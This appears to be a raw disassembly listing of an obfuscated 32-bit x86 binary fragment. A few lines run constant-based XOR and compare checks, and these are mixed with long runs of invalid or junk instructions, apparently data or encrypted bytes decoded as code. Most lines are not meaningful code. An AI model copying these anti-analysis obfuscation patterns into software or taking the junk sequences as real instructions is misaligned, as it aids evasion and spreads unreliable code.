  401934:	test   al,0xa7
  401936:	(bad)  
  401937:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401938:	push   es
  401939:	push   eax
  40193a:	pop    ebp
  40193b:	jo     0x401992
  40193d:	mov    edi,0x4c7a40f
  401942:	xchg   ebx,eax
  401943:	inc    eax
  401944:	jecxz  0x4019c5
  401946:	into   
  401947:	pushf  
  401948:	dec    ebx
  401949:	(bad)  
  40194a:	push   ebx
  40194b:	imul   ecx,DWORD PTR [ecx+0x458be445],0xffffffe4
  401952:	mov    DWORD PTR [eax],0xf89f2da9
  401958:	mov    eax,DWORD PTR [ebp-0x14]
  40195b:	mov    ebx,DWORD PTR [ebp-0x8]
  40195e:	xor    eax,ecx
  401960:	xor    ebx,ecx
  401962:	xor    edx,edx
  401964:	add    eax,esi
  401966:	add    ebx,esi
  401968:	div    ebx
  40196a:	mov    edx,DWORD PTR [ebp-0x2c]
  40196d:	cmp    eax,DWORD PTR [edx]
  40196f:	je     0x40271e
  401975:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40197c:	lea    eax,[ebp-0xc]
  40197f:	mov    DWORD PTR [ebp-0x10],eax
  401982:	jmp    0x401b9f
  401987:	int3   
  401988:	sub    eax,0xbde9be20
  40198d:	push   0xffffffa9
  40198f:	mov    ebp,0xa17bf628
  401994:	sbb    eax,0x7a70e957
  401999:	jo     0x401a0b
  40199b:	jo     0x401a1b
  40199d:	jo     0x401a0f
  40199f:	inc    edx
  4019a0:	lahf   
  4019a1:	adc    eax,DWORD PTR [ebp-0x1e]
  4019a4:	mov    ch,0x68
  4019a6:	xor    DWORD PTR [esi],0xfffffffb
  4019a9:	scas   al,BYTE PTR es:[edi]
  4019aa:	xor    dh,BYTE PTR [ebx+0x37]
  4019ad:	ins    BYTE PTR es:[edi],dx
  4019ae:	xchg   esp,eax
  4019af:	jmp    0x401a08
  4019b1:	outs   dx,BYTE PTR ds:[esi]
  4019b2:	retf   
  4019b3:	jns    0x4019ba
  4019b5:	pop    esi
  4019b6:	jmp    0x7c4f7000
  4019bb:	adc    DWORD PTR [eax+ebx*2+0x8cfd513],esp
  4019c2:	test   eax,0x23da558d
  4019c7:	pop    ebx
  4019c8:	(bad)  
  4019ca:	jge    0x401a3a
  4019cc:	leave  
  4019cd:	out    dx,al
  4019ce:	mov    esi,edi
  4019d0:	hlt    
  4019d1:	adc    al,bl
  4019d3:	fnstenv [edi]
  4019d5:	push   0xffffff84
  4019d7:	call   0x7e816a84
  4019dc:	add    eax,0x8ab9d705
  4019e1:	or     al,0x11
  4019e3:	push   edi
  4019e4:	jne    0x4019de
  4019e6:	call   0x5b7c5d39
  4019eb:	add    bh,BYTE PTR [ecx-0x2f]
  4019ee:	(bad)  
  4019ef:	(bad)  
  4019f0:	(bad)  
  4019f1:	ss pop edx
  4019f3:	mov    ecx,0x857a5aba
  4019f8:	(bad)  
  4019f9:	xor    BYTE PTR [edx+0x51],al
  4019fc:	scas   al,BYTE PTR es:[edi]
  4019fd:	das    
  4019fe:	xchg   ebx,eax
  4019ff:	leave  
  401a00:	mov    edx,0xa3cbe2fd
  401a05:	jnp    0x4019cf
  401a07:	xor    dh,BYTE PTR [esi]
  401a09:	es jne 0x401a20
  401a0c:	pusha  
  401a0d:	and    eax,0x7a86f6e0
  401a12:	inc    ebp
  401a13:	jae    0x401a51
  401a15:	bound  eax,QWORD PTR [ebx+0x7a]
  401a18:	mov    BYTE PTR [eax-0x31],dl
  401a1b:	add    esi,ebp
  401a1d:	sub    BYTE PTR [edx],0xc0
  401a20:	or     BYTE PTR [eax-0x67],bh
  401a23:	jne    0x4019d4
  401a25:	inc    esp
  401a26:	aaa    
  401a27:	sub    BYTE PTR [edi],dh
  401a29:	adc    al,BYTE PTR [ebx+0x2b40074d]
  401a2f:	push   edi
  401a30:	(bad)  
  401a31:	in     al,0xaf
  401a33:	arpl   WORD PTR [esi+0x20],cx
  401a36:	das    
  401a37:	les    ecx,FWORD PTR [edx+0x2453da89]
  401a3d:	and    eax,0xf962153
  401a42:	add    BYTE PTR [ecx+ebx*1-0x67],dh
  401a46:	ins    DWORD PTR es:[edi],dx
  401a47:	fsubr  DWORD PTR [edi]
  401a49:	xchg   edx,eax
  401a4a:	in     eax,dx
  401a4b:	call   0x69e572c1
  401a50:	das    
  401a51:	pop    eax
  401a52:	cwde   
  401a53:	jle    0x401a0f
  401a55:	xlat   BYTE PTR ds:[ebx]
  401a56:	int    0xec
  401a58:	loop   0x401ab4
  401a5a:	test   BYTE PTR [ebx-0x2d154fa9],ah
  401a60:	hlt    
  401a61:	pushf  
  401a62:	out    0x64,al
  401a64:	ds idiv bh
  401a67:	jmp    FWORD PTR [ecx+0x3b]
  401a6a:	mov    bh,0x84
  401a6c:	pop    ecx
  401a6d:	out    0x2f,al
  401a6f:	cmp    BYTE PTR [edx+ebx*2+0x4bbf817c],al
  401a76:	dec    esi
  401a77:	std    
  401a78:	fs aas 
  401a7a:	enter  0x4f7e,0x76
  401a7e:	pop    ecx
  401a7f:	cmc    
  401a80:	jle    0x401a16
  401a82:	push   esi
  401a83:	jns    0x401b04
  401a85:	push   esi
  401a86:	jbe    0x401a31
  401a88:	xchg   edi,eax
  401a89:	dec    edx
  401a8a:	push   ebp
  401a8b:	or     ecx,0x80dd43ed
  401a91:	mov    esi,0x58f021e0
  401a96:	mov    dh,0x5f
  401a98:	outs   dx,BYTE PTR ds:[esi]
  401a99:	or     ebp,edi
  401a9b:	xchg   edx,eax
  401a9c:	ja     0x401abc
  401a9e:	fs lea edx,ds:[ebp-0x41df3b64]
  401aa6:	jns    0x401ace
  401aa8:	or     al,0x19
  401aaa:	(bad)  
  401aab:	fcomp  st(4)
  401aad:	arpl   ax,cx
  401aaf:	fdiv   st,st(2)
  401ab1:	icebp  
  401ab2:	xor    BYTE PTR [edi-0x56],dl
  401ab5:	test   ax,0x777f
  401ab9:	xchg   esi,eax
  401aba:	mov    ah,0xa5
  401abc:	cmp    BYTE PTR [edx+0x48],bl
  401abf:	jnp    0x401a6a
  401ac1:	sti    
  401ac2:	mov    ecx,0xfdcd3da9
  401ac7:	and    DWORD PTR [esi-0x3b92f34],0xffffffb0
  401ace:	dec    esi
  401acf:	(bad)  
  401ad0:	outs   dx,DWORD PTR ds:[esi]
  401ad1:	bound  ebp,QWORD PTR [ebx+0x2acb0e00]
  401ad7:	aad    0xa2
  401ad9:	push   ecx
  401ada:	stos   BYTE PTR es:[edi],al
  401adb:	in     al,dx
  401adc:	push   0x384503c0
  401ae1:	xor    ecx,DWORD PTR ds:0x5ed1c697
  401ae7:	adc    eax,0x2f9d7519
  401aec:	(bad)  
  401aed:	pop    ecx
  401aee:	push   0x5e
  401af0:	sbb    BYTE PTR [edi+ecx*8-0x3acebbd3],bl
  401af7:	aam    0xaa
  401af9:	(bad)  
  401afa:	xchg   esi,eax
  401afb:	jmp    0x401ac4
  401afd:	mov    edx,0x876a79eb
  401b02:	std    
  401b03:	nop
  401b04:	push   esi
  401b05:	sub    BYTE PTR [ebx-0xc377808],ch
  401b0b:	pop    edx
  401b0c:	adc    dl,BYTE PTR [ecx-0x62]
  401b0f:	ins    DWORD PTR es:[edi],dx
  401b10:	fwait
  401b11:	pop    ebx
  401b12:	retf   
  401b13:	ins    BYTE PTR es:[edi],dx
  401b14:	fs inc ebp
  401b16:	ins    DWORD PTR es:[edi],dx
  401b17:	pop    esp
  401b18:	mov    al,ds:0xc7e2b312
  401b1d:	fidiv  DWORD PTR [ebx-0x1e8f4b6f]
  401b23:	loop   0x401b12
  401b25:	adc    ebx,edx
  401b27:	add    al,0x67
  401b29:	test   al,0x4e
  401b2b:	std    
  401b2c:	dec    ebp
  401b2d:	loope  0x401b3d
  401b2f:	dec    edi
  401b30:	mov    cl,0x34
  401b32:	and    esi,DWORD PTR [ebp+0x62]
  401b35:	xchg   esp,eax
  401b36:	jmp    0x3ee5:0x23cd9719
  401b3d:	std    
  401b3e:	sub    DWORD PTR [ebp+0x6],ebp
  401b41:	cmp    edx,eax
  401b43:	pushf  
  401b44:	mov    ecx,0x5d0dc98f
  401b49:	je     0x401b88
  401b4b:	mov    edi,0xaa8b7c88
  401b50:	iret   
  401b51:	es call 0x791c:0xe76490f
  401b59:	xor    esp,0xe802162e
  401b5f:	addr16 dec esp
  401b61:	test   ebx,ebp
  401b63:	or     al,0x88
  401b65:	push   edx
  401b66:	jmp    0x401bd6
  401b68:	xchg   edx,eax
  401b69:	(bad)  
  401b6a:	mov    eax,0xb6293793
  401b6f:	xchg   esp,eax
  401b70:	ins    DWORD PTR es:[edi],dx
  401b71:	pop    edi
  401b72:	push   ds
  401b73:	mov    eax,DWORD PTR [edx-0x4d6d12a9]
  401b79:	fsub   QWORD PTR [edx]
  401b7b:	cli    
  401b7c:	test   DWORD PTR [eax],esp
  401b7e:	mov    bh,0x44
  401b80:	xor    edx,DWORD PTR [eax]
  401b82:	push   ds
  401b83:	ror    DWORD PTR [edx],0xd2
  401b86:	ins    DWORD PTR es:[edi],dx
  401b87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b88:	sbb    al,0x94
  401b8a:	xchg   ebp,eax
  401b8b:	inc    esp
  401b8c:	ficomp WORD PTR ds:0x4079418
  401b92:	push   esi
  401b93:	test   DWORD PTR [eax-0x6590189f],esi
  401b99:	mov    BYTE PTR [esi],bl
  401b9b:	enter  0x73ea,0x14
  401b9f:	mov    eax,DWORD PTR [ebp-0x10]
  401ba2:	mov    edx,DWORD PTR [eax]
  401ba4:	imul   edx,edx,0xf89ea9ec
  401baa:	mov    DWORD PTR [eax],edx
  401bac:	mov    eax,DWORD PTR [ebp-0xc]
  401baf:	cmp    eax,0x742b26d4
  401bb4:	je     0x401bc8
  401bba:	mov    eax,DWORD PTR [ebp-0x1c]
  401bbd:	or     DWORD PTR [eax],0x60751c9c
  401bc3:	jmp    0x40272d
  401bc8:	mov    eax,DWORD PTR [ebp-0xc]
  401bcb:	jmp    0x401de8
  401bd0:	popa   
  401bd1:	ja     0x401bca
  401bd3:	add    esi,ecx
  401bd5:	xor    DWORD PTR [ecx+0x75],0xffffffde
  401bd9:	adc    al,0xb4
  401bdb:	mov    cl,BYTE PTR [ecx-0xb]
  401bde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401be0:	jo     0x401c5a
  401be2:	jo     0x401c54
  401be4:	jo     0x401c64
  401be6:	jo     0x401c58
  401be8:	jg     0x401c47
  401bea:	(bad)
  401bed:	fstp   DWORD PTR [esi]
  401bef:	adc    ebx,DWORD PTR [esi]
  401bf1:	mov    bh,0x11
  401bf3:	in     al,0x89
  401bf5:	mov    ebx,0x51d7222e
  401bfa:	dec    esp
  401bfb:	push   ecx
  401bfc:	cmc    
  401bfd:	aas    
  401bfe:	jbe    0x401b97
  401c00:	fst    QWORD PTR [eax-0x61]
  401c03:	(bad)  
  401c06:	push   es
  401c07:	sub    al,0x86
  401c09:	cmp    DWORD PTR [eax],ecx
  401c0b:	lea    eax,[ecx]
  401c0d:	xlat   BYTE PTR ds:[ebx]
  401c0e:	sbb    al,0x1b
  401c10:	popf   
  401c11:	push   edx
  401c12:	add    esi,edx
  401c14:	jns    0x401c11
  401c16:	jmp    0x401c76
  401c18:	sbb    eax,0x1e9be5c
  401c1d:	clc    
  401c1e:	pop    edx
  401c1f:	sub    al,0x4
  401c21:	xchg   edx,eax
  401c22:	in     al,dx
  401c23:	pop    ecx
  401c24:	mov    edx,0xf54643bb
  401c29:	dec    edi
  401c2a:	jne    0x401c6e
  401c2c:	inc    ebx
  401c2d:	pusha  
  401c2e:	xchg   ebx,edi
  401c30:	mov    ebp,DWORD PTR [esi-0xc47333c]
  401c36:	imul   DWORD PTR [esi+0x72c060]
  401c3c:	inc    esp
  401c3d:	cwde   
  401c3e:	mov    esi,0x99d94d72
  401c43:	inc    esp
  401c44:	mov    fs,esp
  401c46:	add    BYTE PTR [edx+0x27d24ca6],bh
  401c4c:	dec    esi
  401c4d:	mov    ds:0x67921268,eax
  401c52:	pop    edi
  401c53:	jb     0x401ccb
  401c55:	push   esi
  401c56:	call   FWORD PTR [esi+0xa]
  401c59:	sti    
  401c5a:	add    BYTE PTR [esp+ebx*1-0x67686b62],ah
  401c61:	(bad)
  401c64:	daa    
  401c65:	cld    
  401c66:	xchg   DWORD PTR [esi+0x5cbd460b],edx
  401c6c:	and    al,0x61
  401c6e:	rcl    BYTE PTR [ecx+0x6c268d37],0xa0
  401c75:	scas   al,BYTE PTR es:[edi]
  401c76:	or     edx,DWORD PTR [ebp+0x33008d2b]
  401c7c:	and    esi,esp
  401c7e:	jo     0x401cb6
  401c80:	cwde   
  401c81:	cmc    
  401c82:	int    0xfb
  401c84:	mov    DWORD PTR [edi+0x18],esp
  401c87:	fcom   QWORD PTR [eax+0x54]
  401c8a:	xor    edi,DWORD PTR [ebx+0x47]
  401c8d:	lock xchg esi,eax
  401c8f:	int3   
  401c90:	push   esp
  401c91:	mov    eax,0x93ec78e1
  401c96:	push   eax
  401c97:	sbb    eax,0x94dbe0dc
  401c9c:	jnp    0x401cd3
  401c9e:	lahf   
  401c9f:	cli    
  401ca0:	inc    edx
  401ca1:	sar    DWORD PTR cs:[esi],cl
  401ca4:	jns    0x401cac
  401ca6:	xor    DWORD PTR [ebx],esi
  401ca8:	push   0x26
  401caa:	popf   
  401cab:	out    0x1f,eax
  401cad:	icebp  
  401cae:	sti    
  401caf:	js     0x401cd4
  401cb1:	lods   eax,DWORD PTR ds:[esi]
  401cb2:	repnz loopne 0x401cb8
  401cb5:	scas   eax,DWORD PTR es:[edi]
  401cb6:	cld    
  401cb7:	xchg   ebx,eax
  401cb8:	aas    
  401cb9:	mov    ds:0x8b0fd4c8,eax
  401cbe:	push   eax
  401cbf:	pushf  
  401cc0:	es push esi
  401cc2:	pop    edx
  401cc3:	add    edx,DWORD PTR [ebp+0x23713edd]
  401cc9:	dec    ebp
  401cca:	outs   dx,BYTE PTR ds:[esi]
  401ccb:	scas   eax,DWORD PTR es:[edi]
  401ccc:	inc    ebp
  401ccd:	xchg   esi,eax
  401cce:	in     eax,0xe4
  401cd0:	adc    esp,DWORD PTR [edx+0x6d29e160]
  401cd6:	jnp    0x401d23
  401cd8:	out    dx,eax
  401cd9:	mov    ah,0x8f
  401cdb:	xchg   ecx,eax
  401cdc:	inc    esi
  401cdd:	outs   dx,BYTE PTR ds:[esi]
  401cde:	inc    edx
  401cdf:	adc    eax,0x47df3d0a
  401ce4:	mov    ebx,0x6faad673
  401ce9:	sbb    DWORD PTR [ebx-0x4c],edi
  401cec:	pop    esi
  401ced:	adc    bh,BYTE PTR [esi+0x3eefa9b6]
  401cf3:	imul   edi,DWORD PTR [eax],0x82c9e762
  401cf9:	xchg   edi,eax
  401cfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cfb:	outs   dx,BYTE PTR ds:[esi]
  401cfc:	enter  0xf9cd,0xbd
  401d00:	mov    bh,0x91
  401d02:	xor    dh,ah
  401d04:	jecxz  0x401d1c
  401d06:	mov    ebp,0x3245a232
  401d0b:	jp     0x401cae
  401d0d:	dec    ebx
  401d0e:	mov    ds:0x698553d9,al
  401d13:	push   ds
  401d14:	mov    eax,0xd5214fd4
  401d19:	mov    WORD PTR ds:0x923c1c6d,gs
  401d1f:	(bad)  [ecx-0x7]
  401d22:	add    BYTE PTR [edx],ah
  401d24:	dec    edx
  401d25:	loopne 0x401d6a
  401d27:	push   ebx
  401d28:	cmp    al,0x57
  401d2a:	mov    ebp,0x398b53fa
  401d2f:	pop    es
  401d30:	jno    0x401d14
  401d32:	mov    bh,0xbd
  401d34:	mov    al,0xd9
  401d36:	fbld   TBYTE PTR [edi+0x7f]
  401d39:	jmp    0x2acd5ff4
  401d3e:	in     al,dx
  401d3f:	aas    
  401d40:	loop   0x401d55
  401d42:	std    
  401d43:	aad    0xf5
  401d45:	scas   al,BYTE PTR es:[edi]
  401d46:	cld    
  401d47:	out    dx,eax
  401d48:	(bad)  
  401d49:	hlt    
  401d4a:	adc    ah,BYTE PTR [eax]
  401d4c:	adc    al,0xa3
  401d4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d4f:	mov    esi,0xeaad2ca
  401d54:	call   ebp
  401d56:	mov    bh,0x28
  401d58:	(bad)  
  401d59:	xchg   ecx,eax
  401d5a:	mov    WORD PTR [edx+edi*8+0x7e],cs
  401d5e:	dec    edi
  401d5f:	(bad)  
  401d60:	mov    ebx,0xaedecd17
  401d65:	mov    DWORD PTR [ebp+0x6eef5a28],esi
  401d6b:	or     al,0x14
  401d6d:	jns    0x401dc6
  401d6f:	xor    ebx,DWORD PTR [ecx+ebx*2+0x2a0022e4]
  401d76:	jb     0x401d78
  401d78:	mov    ebp,0x37424a39
  401d7d:	outs   dx,DWORD PTR ds:[esi]
  401d7e:	ss (bad) 
  401d80:	aas    
  401d81:	not    DWORD PTR [eax]
  401d83:	xchg   esp,eax
  401d84:	into   
  401d85:	daa    
  401d86:	mov    esp,0x5a860e03
  401d8b:	xlat   BYTE PTR ds:[ebx]
  401d8c:	retf   0xd0be
  401d8f:	aam    0x40
  401d91:	inc    edx
  401d92:	pop    eax
  401d93:	scas   eax,DWORD PTR es:[edi]
  401d94:	(bad)  
  401d96:	inc    ebp
  401d97:	and    ebx,esp
  401d99:	inc    edi
  401d9a:	xor    esp,DWORD PTR [ecx+edi*8+0x48]
  401d9e:	lds    esp,FWORD PTR [esi]
  401da0:	jbe    0x401d5d
  401da2:	xchg   edi,eax
  401da3:	inc    ecx
  401da4:	daa    
  401da5:	or     bl,BYTE PTR [ecx+eax*1+0x25]
  401da9:	and    esi,DWORD PTR [ecx-0x77e60921]
  401daf:	and    cl,bl
  401db1:	ret    
  401db2:	imul   DWORD PTR [esi]
  401db4:	fstp   TBYTE PTR [ecx+0x1a4cfb47]
  401dba:	daa    
  401dbb:	fild   DWORD PTR [ebx-0x4e]
  401dbe:	add    ebp,edi
  401dc0:	mov    edi,0x923c952c
  401dc5:	repnz cmp al,0x33
  401dc8:	xor    DWORD PTR [ebx-0x3d],esi
  401dcb:	inc    edi
  401dcc:	mov    WORD PTR [ebx+ebx*1],?
  401dcf:	call   DWORD PTR [eax-0x6c8c7348]
  401dd5:	jle    0x401db1
  401dd7:	xchg   esp,eax
  401dd8:	pop    ds
  401dd9:	and    BYTE PTR [edi+0x27],ch
  401ddc:	shl    bh,1
  401dde:	mov    dh,0x3b
  401de0:	das    
  401de1:	push   edi
  401de2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401de3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401de4:	sub    al,0x50
  401de6:	inc    ecx
  401de7:	rol    DWORD PTR [ebx],cl
  401de9:	inc    ebp
  401dea:	call   0xca949b2c
  401def:	ins    BYTE PTR es:[edi],dx
  401df0:	je     0x401e04
  401df6:	mov    eax,DWORD PTR [ebp-0x10]
  401df9:	and    DWORD PTR [eax],0x751c99
  401dff:	jmp    0x40272d
  401e04:	mov    eax,DWORD PTR [ebp-0xc]
  401e07:	mov    edx,DWORD PTR [ebp-0x18]
  401e0a:	or     eax,edx
  401e0c:	cmp    eax,0xfcbf2ffd
  401e11:	je     0x401e25
  401e17:	mov    eax,DWORD PTR [ebp-0x10]
  401e1a:	xor    DWORD PTR [eax],0x2650fa8f
  401e20:	jmp    0x40272d
  401e25:	mov    ax,WORD PTR [ebp-0x4]
  401e29:	mov    edx,0x8a3e
  401e2e:	xor    ax,dx
  401e31:	jmp    0x40204e
  401e36:	cld    
  401e37:	test   BYTE PTR [edx+0x3d],ch
  401e3a:	jb     0x401e31
  401e3c:	stos   DWORD PTR es:[edi],eax
  401e3d:	inc    ecx
  401e3e:	inc    eax
  401e3f:	(bad)  
  401e40:	cmp    BYTE PTR [esi+edx*2+0x1c],dl
  401e44:	loopne 0x401eae
  401e46:	jo     0x401e4e
  401e48:	jo     0x401eba
  401e4a:	jo     0x401eca
  401e4c:	jo     0x401ebe
  401e4e:	stc    
  401e4f:	cli    
  401e50:	cmc    
  401e51:	ror    dl,cl
  401e53:	push   edx
  401e54:	lahf   
  401e55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e56:	push   cs
  401e57:	mov    eax,0xac9b3484
  401e5c:	stos   DWORD PTR es:[edi],eax
  401e5d:	js     0x401ec7
  401e5f:	(bad)
  401e62:	ret    
  401e63:	jmp    DWORD PTR [esi+0x4c]
  401e66:	imul   ecx,DWORD PTR [eax+0x270ac665],0x19e958af
  401e70:	fist   WORD PTR [ebx-0x7c]
  401e73:	nop
  401e74:	jmp    0xcf5d:0x780d781d
  401e7b:	jmp    0xcddb:0x7cd39ab1
  401e82:	push   0x8f062dee
  401e87:	pop    ds
  401e88:	pop    eax
  401e89:	das    
  401e8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e8b:	hlt    
  401e8c:	add    eax,0xf102e70
  401e91:	and    al,0x59
  401e93:	add    DWORD PTR [eax+0x25],esp
  401e96:	mov    edx,0x7aecebf1
  401e9b:	sbb    eax,0xb8d9a377
  401ea0:	clc    
  401ea1:	fimul  WORD PTR [edi+0x1697e4ed]
  401ea7:	jne    0x401ecc
  401ea9:	cmc    
  401eaa:	in     al,dx
  401eab:	sti    
  401eac:	cdq    
  401ead:	dec    ebx
  401eae:	push   edx
  401eaf:	cli    
  401eb0:	out    0xd1,al
  401eb2:	mov    DWORD PTR [esi-0x28],ebx
  401eb5:	jne    0x401e6a
  401eb7:	outs   dx,BYTE PTR ds:[esi]
  401eb8:	not    DWORD PTR [edx+0x659cad65]
  401ebe:	jp     0x401ec7
  401ec0:	xor    ecx,DWORD PTR [esp+esi*1-0x29172b23]
  401ec7:	es inc edi
  401ec9:	xor    BYTE PTR [ebx],0xa1
  401ecc:	outs   dx,BYTE PTR fs:[esi]
  401ece:	adc    esp,DWORD PTR [edi]
  401ed0:	mov    eax,ds:0x8ec78670
  401ed5:	add    ah,BYTE PTR [ecx+0x2e8d1e35]
  401edb:	and    BYTE PTR [eax+0xa0ea236],dl
  401ee1:	sub    DWORD PTR [ecx-0x22],ebp
  401ee4:	sbb    BYTE PTR [esi+0x3e],bl
  401ee7:	les    ebp,FWORD PTR [ecx+0x75]
  401eea:	xor    eax,0x8c988793
  401eef:	ss xchg esi,eax
  401ef1:	inc    edi
  401ef2:	(bad)  
  401ef3:	mov    ebx,0x96f0e4d0
  401ef8:	int    0xc4
  401efa:	mov    eax,ds:0x2922c0c
  401eff:	jmp    0x8dc002ad
  401f04:	inc    edi
  401f05:	adc    dl,dl
  401f07:	sbb    bh,al
  401f09:	adc    ecx,DWORD PTR [ebp+0x50]
  401f0c:	inc    esp
  401f0d:	shl    ch,0x4c
  401f10:	ins    BYTE PTR es:[edi],dx
  401f11:	inc    ecx
  401f12:	sub    BYTE PTR [esi-0x79],0x53
  401f16:	pop    eax
  401f17:	xlat   BYTE PTR ds:[ebx]
  401f18:	adc    al,BYTE PTR [ebx-0x184f7393]
  401f1e:	lea    esp,[edi+0x2f19162e]
  401f24:	imul   eax,DWORD PTR [ecx+0x5b459128],0xffffffd4
  401f2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f2c:	push   cs
  401f2d:	xor    esi,DWORD PTR [edi+0x28a40336]
  401f33:	popf   
  401f34:	je     0x401f94
  401f36:	push   eax
  401f37:	out    0x8c,al
  401f39:	adc    ecx,DWORD PTR [edi]
  401f3b:	inc    esp
  401f3c:	inc    ebx
  401f3d:	xor    bl,dh
  401f3f:	js     0x401f89
  401f41:	fsubr  QWORD PTR [esi-0x650ea38c]
  401f47:	xor    esp,DWORD PTR [eax]
  401f49:	ja     0x401fca
  401f4b:	xlat   BYTE PTR ds:[ebx]
  401f4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f4d:	push   ss
  401f4e:	jne    0x401f9f
  401f50:	sub    DWORD PTR [ecx+0x5],ebx
  401f53:	xchg   esi,eax
  401f54:	or     eax,0x822686ff
  401f59:	jne    0x401fbd
  401f5b:	into   
  401f5c:	imul   edi,DWORD PTR [eax],0x15903792
  401f62:	sub    BYTE PTR [ebx+0xe],0x15
  401f66:	push   ebx
  401f67:	fsub   DWORD PTR [esi+0x1c]
  401f6a:	test   eax,0xdc3d40f3
  401f6f:	xor    al,0x0
  401f71:	xchg   ecx,eax
  401f72:	xchg   edi,eax
  401f73:	lds    ebx,FWORD PTR [edx+0x2e6c440f]
  401f79:	and    BYTE PTR [eax],0xee
  401f7c:	out    0x35,al
  401f7e:	enter  0xc32,0x91
  401f82:	adc    al,0x5
  401f84:	sbb    ecx,DWORD PTR ds:0xdaabd4df
  401f8a:	push   es
  401f8b:	adc    bh,BYTE PTR [esi]
  401f8d:	(bad)  
  401f8e:	sub    ch,BYTE PTR [eax+0x665a84df]
  401f94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f95:	add    eax,DWORD PTR [ebx-0x37]
  401f98:	push   ds
  401f99:	push   edx
  401f9a:	push   esp
  401f9b:	add    ah,BYTE PTR [ebp+0x6c]
  401f9e:	fcmovnbe st,st(2)
  401fa0:	jl     0x401f7d
  401fa2:	pop    edi
  401fa3:	push   edi
  401fa4:	int    0xd7
  401fa6:	xor    DWORD PTR [esi-0x3c55f049],ecx
  401fac:	xor    eax,0xa3f961f4
  401fb1:	pop    esi
  401fb2:	inc    esi
  401fb3:	(bad)  
  401fb4:	mov    esi,0x8a1c13b1
  401fb9:	or     DWORD PTR [esi+0xc],ebx
  401fbc:	jg     0x401f96
  401fbe:	sbb    ch,dl
  401fc0:	inc    eax
  401fc1:	add    BYTE PTR [ebx],ah
  401fc3:	call   0x287d2c83
  401fc8:	inc    edi
  401fc9:	sar    BYTE PTR [ebx+0x7a],1
  401fcc:	jle    0x401fbd
  401fce:	jns    0x401f9c
  401fd0:	pop    ebp
  401fd1:	fldenv [edx-0x80]
  401fd4:	retf   0xf828
  401fd7:	arpl   WORD PTR [ecx+0x3c],cx
  401fda:	jo     0x401fd8
  401fdc:	mov    ah,0x51
  401fde:	mov    ecx,0xb2319597
  401fe3:	icebp  
  401fe4:	std    
  401fe5:	or     eax,0xcaf4f6e2
  401fea:	in     eax,dx
  401feb:	dec    ebx
  401fec:	dec    eax
  401fed:	(bad)  [ecx-0x19]
  401ff0:	xor    bl,cl
  401ff2:	jp     0x401fc6
  401ff4:	arpl   WORD PTR [edi+0x2622b6f8],di
  401ffa:	jno    0x402022
  401ffc:	mov    al,ds:0xbc59fc52
  402001:	sub    eax,0x9bedcb69
  402006:	pop    ebp
  402007:	ins    BYTE PTR es:[edi],dx
  402008:	daa    
  402009:	mov    al,ds:0xca0b2ba1
  40200e:	cs aam 0xcd
  402011:	xchg   edi,eax
  402012:	jne    0x402064
  402014:	ret    
  402015:	cmp    DWORD PTR [ebx+0x277469e5],edx
  40201b:	add    DWORD PTR [ebp+0x2589171],eax
  402021:	xchg   esi,eax
  402022:	rol    ah,1
  402024:	dec    esp
  402025:	stos   BYTE PTR es:[edi],al
  402026:	or     al,0x9a
  402028:	adc    BYTE PTR [ecx],cl
  40202a:	repz mov ebx,0xaa99d391
  402030:	outs   dx,DWORD PTR ds:[esi]
  402031:	test   eax,0x3944daa8
  402036:	mov    al,ds:0x9b933a45
  40203b:	add    eax,0x63fe069b
  402040:	xor    eax,0x53e42c29
  402045:	xor    DWORD PTR [esi],esi
  402047:	add    al,0x1e
  402049:	and    DWORD PTR [edi+0x5f],ebx
  40204c:	jns    0x402011
  40204e:	mov    edx,DWORD PTR [ebp-0x28]
  402051:	mov    edx,DWORD PTR [edx]
  402053:	add    ax,di
  402056:	cmp    ax,WORD PTR [edx]
  402059:	jmp    0x402276
  40205e:	ret    0x801a
  402061:	gs push 0xfb99f171
  402067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402068:	ins    BYTE PTR es:[edi],dx
  402069:	sbb    BYTE PTR [ecx+ebx*8-0x74],0xe2
  40206e:	jo     0x402074
  402070:	jo     0x4020e2
  402072:	jo     0x4020f2
  402074:	jo     0x4020e6
  402076:	pop    eax
  402077:	xor    DWORD PTR [ebp-0x7d],0xaafddfb5
  40207e:	outs   dx,BYTE PTR ds:[esi]
  40207f:	sbb    ah,al
  402081:	lods   eax,DWORD PTR ds:[esi]
  402082:	call   0x190d:0xa9f17611
  402089:	repnz push esp
  40208b:	inc    eax
  40208c:	fisttp QWORD PTR [eax+0x7b]
  40208f:	sahf   
  402090:	jne    0x402103
  402092:	aaa    
  402093:	jge    0x4020f1
  402095:	out    0xe9,al
  402097:	data16 aam 0xed
  40209a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40209b:	nop
  40209c:	xor    al,0x41
  40209e:	das    
  40209f:	stc    
  4020a0:	pop    es
  4020a1:	push   ds
  4020a2:	out    0xac,eax
  4020a4:	push   0xffffff84
  4020a6:	jmp    0x4020ca
  4020a8:	cs pop ebp
  4020aa:	sar    DWORD PTR [edx-0x3],cl
  4020ad:	cmp    al,0xf2
  4020af:	push   esi
  4020b0:	pop    edi
  4020b1:	mov    ebp,0x7d7bbfab
  4020b6:	shr    cl,cl
  4020b8:	pop    edx
  4020b9:	pusha  
  4020ba:	js     0x40205a
  4020bc:	das    
  4020bd:	lock jnp 0x402099
  4020c0:	out    dx,eax
  4020c1:	jne    0x40208c
  4020c3:	nop
  4020c4:	add    eax,0x111dbb28
  4020c9:	cmp    al,0x90
  4020cb:	sub    eax,0xfd37027a
  4020d0:	jg     0x402068
  4020d2:	push   ebx
  4020d3:	clc    
  4020d4:	add    ah,BYTE PTR [eax+edx*8]
